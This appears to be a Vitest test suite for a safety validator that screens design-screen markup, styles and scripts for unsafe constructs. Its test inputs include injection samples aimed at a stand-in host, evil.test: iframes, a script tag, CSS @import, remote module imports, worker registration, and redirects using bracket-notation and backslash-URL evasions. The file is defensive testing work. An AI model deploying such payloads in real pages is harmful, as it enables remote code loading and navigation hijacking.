import { describe, expect, it } from "vitest";
import type { DesignScreenPayload } from "./screen-payload";
import { findScreenSafetyViolations } from "./screen-safety";

function payload(overrides: Partial<DesignScreenPayload> = {}): DesignScreenPayload {
  return {
    markup: "<section><p>Hello</p></section>",
    styles: "p { color: var(--meld-color-text); }",
    script: null,
    actions: [],
    ...overrides,
  } as DesignScreenPayload;
}

function rules(input: DesignScreenPayload): string[] {
  return findScreenSafetyViolations(input).map((finding) => finding.rule);
}

describe("findScreenSafetyViolations", () => {
  it("passes a clean screen", () => {
    expect(findScreenSafetyViolations(payload())).toEqual([]);
  });

  it.each([
    ["<base href='https://evil.test/'>", "forbidden-element"],
    ["<meta http-equiv='refresh' content='0'>", "forbidden-element"],
    ["<link rel='stylesheet' href='https://evil.test/a.css'>", "forbidden-element"],
    ["<iframe src='https://evil.test'></iframe>", "forbidden-element"],
    ["<object data='https://evil.test'></object>", "forbidden-element"],
    ["<embed src='https://evil.test'>", "forbidden-element"],
    ["<form action='https://evil.test'></form>", "forbidden-element"],
    ["<script>alert(1)</script>", "forbidden-element"],
  ])("rejects %s", (markup, rule) => {
    expect(rules(payload({ markup }))).toContain(rule);
  });

  it("rejects a remote URL in an attribute", () => {
    expect(rules(payload({ markup: "<img src='https://evil.test/a.png'>" }))).toContain(
      "remote-url",
    );
  });

  it("rejects a protocol-relative URL", () => {
    expect(rules(payload({ markup: "<img src='//evil.test/a.png'>" }))).toContain(
      "remote-url",
    );
  });

  it("allows a data: image", () => {
    expect(
      findScreenSafetyViolations(payload({ markup: "<img src='data:image/png;base64,AA=='>" })),
    ).toEqual([]);
  });

  it("rejects a remote url() in styles", () => {
    expect(rules(payload({ styles: "body { background: url(https://evil.test/x.png); }" }))).toContain(
      "remote-url",
    );
  });

  it("rejects @import in styles", () => {
    expect(rules(payload({ styles: "@import url(https://evil.test/x.css);" }))).toContain(
      "remote-url",
    );
  });

  it.each([
    ["import('https://evil.test/x.js')", "module-import"],
    ["importScripts('/x.js')", "module-import"],
    ["new Worker('/w.js')", "worker"],
    ["new SharedWorker('/w.js')", "worker"],
    ["navigator.serviceWorker.register('/sw.js')", "worker"],
    ["top.location = 'https://evil.test'", "navigation-api"],
    ["window.location.replace('https://evil.test')", "navigation-api"],
    ["window.open('https://evil.test')", "navigation-api"],
  ])("rejects script using %s", (script, rule) => {
    expect(rules(payload({ script }))).toContain(rule);
  });

  it("reports every violation rather than stopping at the first", () => {
    const findings = findScreenSafetyViolations(
      payload({ markup: "<iframe></iframe><img src='https://evil.test/a.png'>" }),
    );
    expect(findings.map((finding) => finding.rule).sort()).toEqual([
      "forbidden-element",
      "remote-url",
    ]);
  });

  it("names the offending construct in the detail", () => {
    const [finding] = findScreenSafetyViolations(payload({ markup: "<iframe></iframe>" }));
    expect(finding.detail).toContain("iframe");
  });

  // Fix 1: REMOTE_URL accepts backslashes in addition to forward slashes
  it("rejects backslash URLs in markup", () => {
    expect(
      rules(payload({ markup: String.raw`<img src="\\evil.test/a.png">` })),
    ).toContain("remote-url");
  });

  it("rejects mixed slash and backslash URLs", () => {
    expect(
      rules(payload({ markup: String.raw`<img src="https:\\evil.test/a.png">` })),
    ).toContain("remote-url");
  });

  it("allows data URLs with // in the base64 content", () => {
    expect(
      findScreenSafetyViolations(payload({ markup: "<img src='data:image/png;base64,AB//CD=='>" })),
    ).toEqual([]);
  });

  // Fix 2: module-import detects static imports
  it("rejects static import statements", () => {
    expect(
      rules(payload({ script: 'import evil from "https://evil.test/mod.js"' })),
    ).toContain("module-import");
  });

  it("rejects import side-effects", () => {
    expect(rules(payload({ script: 'import "https://evil.test/side.js"' }))).toContain(
      "module-import",
    );
  });

  it("does not match the word important", () => {
    expect(findScreenSafetyViolations(payload({ script: "const x = 'important';" }))).toEqual(
      [],
    );
  });

  // Fix 3: navigation-api with bracket notation
  it("rejects window bracket location assignment", () => {
    expect(
      rules(payload({ script: 'window["location"] = "https://evil.test"' })),
    ).toContain("navigation-api");
  });

  it("rejects window bracket open call", () => {
    expect(
      rules(payload({ script: 'window["open"]("https://evil.test")' })),
    ).toContain("navigation-api");
  });

  it("does not reject modal.open() on unrelated objects", () => {
    expect(findScreenSafetyViolations(payload({ script: "modal.open();" }))).toEqual([]);
  });

  it("does not reject this.open() on this", () => {
    expect(findScreenSafetyViolations(payload({ script: "this.open(true);" }))).toEqual([]);
  });

  // Fix 4: detail contains the actual matched construct, not regex source
  it("includes the actual construct in worker detail, not regex", () => {
    const findings = findScreenSafetyViolations(payload({ script: "new Worker('/w.js')" }));
    const [finding] = findings.filter((f) => f.rule === "worker");
    expect(finding.detail).toContain("Worker");
    expect(finding.detail).not.toMatch(/\\b/);
  });
});
